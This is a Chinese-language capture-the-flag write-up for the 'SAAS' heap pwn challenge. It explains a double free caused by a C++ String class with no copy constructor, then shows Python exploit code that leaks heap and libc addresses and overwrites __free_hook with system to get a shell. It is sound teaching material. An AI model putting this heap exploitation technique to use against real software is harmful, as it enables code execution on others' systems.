# SAAS

* Category: Pwn

Shell

* Score: 400/400
* Solves: 2/286

Crash

* Score: 40/100
* Solves: 137/286
* Score(MFCTF): 194/250
* Solves(MFCTF): 17/124

## Description

This challenge is not about Software as a Service, but String as a Service.

## Overview

一樣是 Linux x64 下的 C++ heap pwn (glibc 2.31)，主要目標在於利用這個有問題的 String implementation。

```c++
class String {
   public:
	char *str;
	size_t len;

	String(const char *s) {
		len = strlen(s);
		str = new char[len + 1];
		strcpy(str, s);
	}
	~String() { delete[] str; }
};
```

## Solution

### Crash

這個其實人工亂試就能弄出來了，看 pre-exam 的 Crash 版解題人數就知道:

```
> nc chals1.ais3.org 6008
===== S(tring)AAS =====
1. Create string
2. Edit string
3. Print string
4. Delete string
> 1
Index: 0
Content: peko
===== S(tring)AAS =====
1. Create string
2. Edit string
3. Print string
4. Delete string
> 3
Index: 0
Length: 4
Content: peko
===== S(tring)AAS =====
1. Create string
2. Edit string
3. Print string
4. Delete string
> 3
Index: 0
Length: 4
Content:
free(): double free detected in tcache 2
timeout: the monitored command dumped core
Aborted
AIS3{congrats_on_crashing_my_editor!_but_can_you_get_shell_from_it?}
```

基本上只要建立一個 String，然後重複 print 它兩次就能出現 double free。雖然很多人解掉，不過還是得理解這是什麼原因才能利用這個 bug 去 heap pwn。

選項三基本上就很單純的 `print(*strs[idx])`，而 `print` 函數也相當單純:

```c++
void print(String s) {
	printf("Length: %zu\n", s.len);
	printf("Content: ");
	write(1, s.str, s.len);
	printf("\n");
}
```

因為這題真正出問題的地方在於 `class String` 定義的時候沒有遵守 [Rule of Three](https://stackoverflow.com/questions/4172722/what-is-the-rule-of-three)，尤其是沒有 copy constructor 這項導致了 double free。當 C++ 在把 `*strs[idx]` 傳遞給 `print` 的時候是直接 pass by value 的，所以整個 object 包括裡面的 pointer 都會被 copy。但是等函數 return 回來之後這個 copy 出來的物件就沒有存在的必要了，所以 `~String()` 會被呼叫到。但是 copy 的時候預設是直接 shallow copy，pointer 也是原封不動的被 copy 了過去，所以第一次 `~String()` 就會在原本的 string 中產生 dangling pointer，下次 print 的時候就 double free 了。

這種問題 Google 一下也是有很多的結果:

* https://www.ptt.cc/bbs/C_and_CPP/M.1478927582.A.A3B.html
* https://stackoverflow.com/questions/5268342/double-free-errors-when-using-shallow-copies-of-objects-how-to-fix
* ...

直接看 IDA 的反編譯結果也能看出它究竟做了哪些事:

```c++
      case 3:
        v11 = readidx();
        if ( !strs[v11] )
          goto LABEL_19;
        v4 = (__int64 *)strs[v11];
        v5 = v4[1];
        v10[0] = *v4;
        v10[1] = v5;
        print(v10);
        String::~String((String *)v10);
        break;
```

### Shell

所以現在我們知道選項 `3` 的 print 實際上是 `print` + `free`，所以就有個 UAF 可以利用。

```python
def create(idx, val):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Content: ", val)


def edit(idx, val):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"New Content: ", val)


def printstr(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())


def delete(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"Index: ", str(idx).encode())
```

我的作法是先 leak 個 heap address 出來:

```python
create(0, b"a" * 16)
printstr(0)
create(1, b"b" * 16)
printstr(0)
io.recvuntil(b"Content: ")
heap_addr = int.from_bytes(io.recvn(6), "little")
print(f"{heap_addr = :#x}")
```

這樣第一次 `printstr(0)` 時把 `aaaa...` free 掉，然後 `create` 的時候因為大小相同從 tcache bin 拿出來當作 `strs[1]` 的 chunk，所以就有 `strs[0]->str == strs[1]`，然後因為 `strs[1]` 的最前面是放指向 `bbbb...` 的 pointer，再次 `printstr(0)` 就能 leak heap，之後可以方便計算一些其他 chunk 的 offset。

之後是要 leak libc，所以我先在前面部分的的前面加了這些東西:

```python
create(15, b"a" * 0x500)
create(14, b"yyyy")  # no consolidate
printstr(15)
```

這樣就能在 heap 上有個 unsorted bin，上面又會出現 libc 讓你 read。結合前面 leak 的 heap address 在 gdb debug 之後知道 libc 的位置是在上面 `+0x60` 的地方，所以可以寫出:

```python
create(0, b"a" * 16)
printstr(0)
create(1, b"b" * 16)
edit(0, flat([heap_addr + 0x40, 0x100]))
printstr(1)
io.recvuntil(b"Content: ")
io.recvn(0x20)
libc_base = int.from_bytes(io.recvn(8), "little") - 0x1BEBE0
print(f"{libc_base = :#x}")
```

`edit` 部分的概念和前面一樣是利用 `strs[0]->str == strs[1]`，也就是它可以寫 `strs[1]` 的 `str` 和 `len` 成任意的值，也就是可以任意(?)讀寫。不過很重要的是不能忘記 `print` 的時候其實是 `print` + `free`，由於 `+0x60` 是原本就已經 free 過的 chunk，所以就算有成功讀到 libc 之後也會因為 double free 直接炸。繞法就是在它的前面找個可以 free 的位置當作讀取點，然後透過控制長度一樣可以讀到 libc。

現在有了 libc，下一步就是在 `__free_hook` 中寫 system，然後 free 一個包含 `/bin/sh` 的 chunk 就能拿 shell 了。寫 `system` 的方法和前面也很相似:

```python
system = libc_base + 0x48E50
freehook = libc_base + 0x1C1E70
print(f"{system = :#x}")
print(f"{freehook = :#x}")
create(0, b"a" * 16)
printstr(0)
create(1, b"b" * 16)
edit(0, flat([freehook, 0x8]))
edit(1, p64(system))
```

然後再來就找個有 `/bin/sh` 的 chunk 即可，我這邊是直接在最一開始拿 unsorted bin 之前先弄 `create(10, b"/bin/sh")`，所以此時再 `delete(10)` 就是 shell 了。

完整的解法在 [solve.py](solve.py) 中。
